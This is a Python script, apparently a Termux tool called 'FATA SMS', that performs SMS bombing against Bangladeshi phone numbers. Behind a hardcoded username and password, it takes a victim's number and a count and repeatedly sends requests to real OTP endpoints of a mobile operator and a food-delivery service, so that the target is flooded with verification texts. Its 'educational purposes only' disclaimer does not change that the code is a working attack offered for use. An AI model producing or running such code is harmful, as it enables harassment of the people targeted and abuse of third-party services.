def logop (z):
  for word in z + '\n':
     sys.stdout.write(word)
     sys.stdout.flush()
     time.sleep(0.001)
    


import os
try:
  #from termcolor import *
  #from pyfiglet import *
  from pytube import *
  import requests,time,os,sys,smtplib,pytube
except:
  print("\033[0;32'40mInstall the all requirements .")
  x = input("Do you want to install? [y or n] :")
  
  if x== 'y' or 'Y':
    os.system('pkg update -y')
    os.system('pkg upgrade -y')
    os.system('pkg install python -y')
    os.system('pip install requests ')
    os.system('pip install pytube')
    
  else:
    
    print("\033[0;32;40mRequirements missing!!.")
    print("\033[0;32;40mPlease install all the requerments") 
  exit()
user = 'xploiter'#
passwd = 'fatasms'#

def word (z):
  for word in z + '\n':
     sys.stdout.write(word)
     sys.stdout.flush()
     time.sleep(0.00)
FSlogo ='''
 

$$\   $$\     $$$$$$$\  $$\       $$$$$$\    $$\ $$$$$$$$\  $$$$$$\  $$$$$$$\  
$$ |  $$ |    $$  __$$\ $$ |     $$$ __$$\ $$$$ |\__$$  __|$$ ___$$\ $$  __$$\ 
\$$\ $$  |    $$ |  $$ |$$ |     $$$$\ $$ |\_$$ |   $$ |   \_/   $$ |$$ |  $$ |
 \$$$$  /     $$$$$$$  |$$ |     $$\$$\$$ |  $$ |   $$ |     $$$$$ / $$$$$$$  |
 $$  $$<      $$  ____/ $$ |     $$ \$$$$ |  $$ |   $$ |     \___$$\ $$  __$$< 
$$  /\$$\     $$ |      $$ |     $$ |\$$$ |  $$ |   $$ |   $$\   $$ |$$ |  $$ |
$$ /  $$ |$$\ $$ |      $$$$$$$$\\$$$$$$  /$$$$$$\  $$ |   \$$$$$$  |$$ |  $$ |
\__|  \__|\__|\__|      \________|\______/ \______| \__|    \______/ \__|  \__|
                                                                               
                                                                               
                                                                               

'''


###

word(FSlogo)

###



import os,sys,smtplib,time,requests


t = time.localtime()
current_time = time.strftime("%H:%M:%S", t)


def word (z):
  for word in z + '\n':
     sys.stdout.write(word)
     sys.stdout.flush()
     time.sleep(0.01)

while True:
  us = input("\033[0;32;40mUSERNAME: ")
  
  if us == 'xploiter':
  
    while True:
      psw = input("\033[0;31;40mPASSWORD: ")
    
      if psw == 'fatasms':
        
        while True:
          logoFS='''


  █████▒▄▄▄     ▄▄▄█████▓ ▄▄▄        ██████  ███▄ ▄███▓  ██████ 
▓██   ▒▒████▄   ▓  ██▒ ▓▒▒████▄    ▒██    ▒ ▓██▒▀█▀ ██▒▒██    ▒ 
▒████ ░▒██  ▀█▄ ▒ ▓██░ ▒░▒██  ▀█▄  ░ ▓██▄   ▓██    ▓██░░ ▓██▄   
░▓█▒  ░░██▄▄▄▄██░ ▓██▓ ░ ░██▄▄▄▄██   ▒   ██▒▒██    ▒██   ▒   ██▒
░▒█░    ▓█   ▓██▒ ▒██▒ ░  ▓█   ▓██▒▒██████▒▒▒██▒   ░██▒▒██████▒▒
 ▒ ░    ▒▒   ▓▒█░ ▒ ░░    ▒▒   ▓▒█░▒ ▒▓▒ ▒ ░░ ▒░   ░  ░▒ ▒▓▒ ▒ ░
 ░       ▒   ▒▒ ░   ░      ▒   ▒▒ ░░ ░▒  ░ ░░  ░      ░░ ░▒  ░ ░
 ░ ░     ░   ▒    ░        ░   ▒   ░  ░  ░  ░      ░   ░  ░  ░  
             ░  ░              ░  ░      ░         ░         ░  
                                                                

'''
        
             
          chose = f'''
#######################################                                     
{1} SMS Bombing    
               
#######################################'''

          logop(logoFS)
          word(chose)
          inpo =''' FATA_SMS>>'''
          x4 = input('\033[1;32;40m'"∆ "+inpo+" :")
          if x4 == '1':
            
           
            while True:
             sms = '''#########################################
NOTE: THIS TOOL IS FOR BANGLADESH ONLY!!

DISCLAIMER: THIS TOOL IS FOR EDUCATIONAL PURPOSES ONLY. IF YOU HARM OTHERS, I WILL NOT TAKE ANY RESPONSIBILITY

Youtube : https://youtube.com/channel/UCQxsdKKHhf1zYpGdqsOKonQ

Facebook: https://www.facebook.com/sab.bir936

######################################### '''
             word(sms)


             num = input("\033[0;32;40mNumber (Without +880) :880")
             msg = input("\033[0;32;40mThreads (Max 100): ")
             mm =int(msg)
             if (mm < 100):
               
               if num.startswith("19") or num.startswith("14"):
                 sent, nsent = 0, 0
                 for i in range(1, mm +1):
                   num1 =str("0"+num)
                   r = requests.post("https://assetliteapi.banglalink.net/api/v1/user/otp-login/request", data={"mobile": num1})
                   if r.status_code == 200:
                     word(f"\033[0;32;40m[ {i} ]Massege Sent !")
                     sent += 1
                     i += 1
                     time.sleep(2)
                     
                   else:
                     word(f"\033[0;31;40m[ {i} ]Massege Not Sent ")
                     time.sleep(4)
                     
                     i+=1

              
               else:
                 sent, nsent = 0, 0
                 for i in range(1, mm +1):
                   data={"query":"\nmutation CreateOtp (\n    $phone: PhoneNumber!\n    $country: String!\n    $uuid: String!\n    $osVersionCode: String\n    $deviceBrand: String\n    $deviceModel: String\n    $requestFrom: String\n) {\n    createOtp(\n        auth: {\n            phone: $phone,\n            countryCode: $country,\n            deviceUuid: $uuid,\n            deviceToken: \"\"\n        }\n        device: {\n            deviceType: WEB\n            osVersionCode: $osVersionCode\n            deviceBrand: $deviceBrand\n            deviceModel: $deviceModel\n        }\n        requestFrom: $requestFrom\n    ){\n        statusCode\n    }\n}\n","variables":{"phone":num,"country":"880","uuid":"64b9bb81-93f3-4757-9e92-9cfbf34d8039","osVersionCode":"Linux armv8l","deviceBrand":"Chrome","deviceModel":"89","requestFrom":"U2FsdGVkX18QITR3WakOCR2OK+zoIpqM7DqxiLf915s="}}
                   res=requests.post("https://api-v4-2.hungrynaki.com/graphql", json=data)
                   fata = ('880'+num)
                   fata = (fata)
       # print(fata)
                   if res.status_code == 200:
                     
                     
                     word('\033[0;32;40m'f"[ {i} ] [✓]SMS Fatse[✓]")
                     sent += 1
                     i += 1
                   else:
                     word(f"[ {i} ] [×]SMS Fate nai[×]")
                     i += 1
       

               #print(colored(res, 'green'))
               break  
               i += 1
             else:
               word("\033[0;32;40mMax Threads 100")


            totalhit  = i-1

            nsent     = totalhit - sent
 
            print(f"\033[0;32;40m[√]Total Hits : {totalhit}")

            print(f"[✓]Total Sent : {sent}")

            print(f"[×]Total Not Sent : {nsent}")
            print("Bombing is over. Jao chocolate khao ekhon :)")
            time.sleep(0.7)
            break
             
            
